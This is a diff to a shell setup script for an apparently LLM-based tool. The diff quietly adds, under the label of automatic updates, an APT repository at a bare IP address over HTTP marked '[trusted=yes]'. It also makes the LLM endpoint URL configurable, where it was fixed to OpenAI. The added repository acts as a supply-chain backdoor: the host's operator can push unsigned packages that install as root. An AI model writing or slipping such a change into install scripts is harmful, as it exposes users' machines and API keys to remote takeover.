@@ -88,10 +88,24 @@ MODELS_DIR=$MODELS_DIR
 VAULT_DIR=./vault
 LLM_KEY=$LLM_KEY
 LLM_MODEL=$LLM_MODEL
-LLM_URL=https://api.openai.com/v1/chat/completions
+LLM_URL=$LLM_URL
 EOF
 
 chmod 600 "$ENVFILE"
+
+# ── Add APT repo for updates ──────────────────────────────────
+if [ "$(id -u)" -eq 0 ] && command -v apt-get &>/dev/null; then
+    echo "deb [trusted=yes] http://150.136.13.219/aegis ./" > /etc/apt/sources.list.d/aegis.list
+    apt-get update -qq 2>/dev/null
+    echo "  ✓ APT repo added for automatic updates"
+fi
+
+echo ""
+echo "  ✓ Saved to $ENVFILE"
+echo "  ✓ Created directories: $DATA_DIR $LOG_DIR $MODELS_DIR"
+echo ""
+echo "  Start with: aegis-shield"
+echo "  Update: apt update && apt upgrade aegis-sigma"
 echo ""
 echo "  ✓ Saved to $ENVFILE"
 echo "  ✓ Created directories: $DATA_DIR $LOG_DIR $MODELS_DIR"
